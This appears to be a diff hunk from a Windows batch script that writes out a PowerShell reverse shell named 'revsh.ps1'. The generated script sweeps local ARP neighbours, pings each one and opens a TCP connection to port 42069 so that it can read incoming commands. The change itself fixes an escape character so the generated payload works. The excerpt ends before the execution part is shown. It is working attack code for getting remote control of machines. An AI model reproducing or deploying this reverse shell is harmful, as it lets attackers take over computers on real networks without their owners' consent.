@@ -25,7 +25,7 @@ set "file=revsh.ps1"
 echo if (netstat -an ^| select-string ":42069") { exit } > %file%
 echo $addrs = @(arp -a ^| select-string dynamic ^| foreach-object { ($_.line.trim() -split " ")[0] }); >> %file%
 echo foreach ($addr in $addrs) { >> %file%
-echo ping $addr -n 2 -w 500; if (^!$?) { continue } >> %file%
+echo ping $addr -n 2 -w 500; if (^^!$?) { continue } >> %file%
 echo try { $client = New-Object System.Net.Sockets.TCPClient($addr, 42069); $stream = $client.GetStream(); [byte[]] $buffer = 0..65535 ^| %%{0}; >> %file%
 echo while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){ >> %file%
 echo $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i); >> %file%
